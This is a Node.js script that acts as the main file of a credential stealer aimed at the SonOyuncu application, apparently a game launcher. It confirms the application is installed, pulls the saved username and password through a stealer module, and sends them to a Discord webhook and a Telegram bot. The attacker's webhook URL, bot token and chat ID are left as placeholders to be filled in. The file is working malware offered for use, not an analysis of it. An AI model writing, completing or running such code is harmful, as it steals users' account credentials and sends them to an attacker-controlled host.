const SonOyuncuStealer = require('./sonoyuncustealer/index.js');
const WebhookSender = require('./webhook.js');

const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';

const stealer = new SonOyuncuStealer(false);
const webhook = new WebhookSender(DISCORD_WEBHOOK_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);

async function main() {
    try {
        console.log('Checking SonOyuncu application...');

        if (!stealer.checkApplicationExists()) {
            console.error('SonOyuncu application not found');
            return;
        }

        console.log('Extracting credentials...');
        const credentials = stealer.extractCredentials();

        if (!credentials) {
            console.error('Failed to extract credentials');
            return;
        }

        console.log(`Found credentials for: ${credentials.username}`);

        const success = await webhook.sendSonOyuncuEmbed(credentials.username, credentials.password);

        if (success) {
            console.log('Successfully sent to Discord/Telegram');
        } else {
            console.error('Failed to send webhook');
        }

    } catch (error) {
        console.error('Error:', error.message);
    }
}

main();
